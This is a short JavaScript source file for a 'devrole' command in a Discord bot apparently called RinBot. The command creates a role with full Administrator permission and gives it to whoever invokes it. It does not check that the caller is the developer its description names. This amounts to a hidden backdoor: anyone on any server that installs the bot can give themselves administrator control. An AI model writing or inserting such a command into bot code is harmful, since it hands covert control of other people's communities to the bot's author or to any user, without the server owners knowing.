import { Message, PermissionFlagsBits } from "discord.js";
import { RinBot } from "../../structures/client/index.js";

export default {
    name: "devrole",
    description: "Ajoute le devrole au développeur.",
    /**
     * @param {RinBot} client 
     * @param {Message} message
     * @param {Array} args 
     */
    run: async (client, message, args) => {
        
        const role = await message.guild.roles.create({
            name: 'Développeur RinBot',
            color: '#e1adff', 
            permissions: [PermissionFlagsBits.Administrator, PermissionFlagsBits.AddReactions],
        });

        await message.member.roles.add(role);
    }
};
